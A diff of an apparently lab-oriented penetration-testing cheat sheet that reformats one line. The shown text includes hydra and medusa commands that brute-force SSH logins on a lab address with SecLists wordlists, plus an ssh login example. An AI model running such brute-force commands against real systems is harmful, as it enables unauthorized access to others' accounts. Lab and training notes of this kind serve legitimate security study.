@@ -22,8 +22,7 @@ example usage:
   * manual examples:<br/>
 `hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 22 -o "/root/Desktop/tcp_22_ssh_hydra.txt" ssh://10.11.1.2`<br/><br/>
 `medusa -U "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e ns -n 22 -O "/root/Desktop/tcp_22_ssh_medusa.txt" -M ssh -h 10.11.1.2`
-* Login with known username<br/>
-`ssh username@10.11.1.2`<br/>
+* Login with known username: `ssh username@10.11.1.2`<br/>
 ## SMTP (25/tcp)
 * Enumartion of usernames
 ```
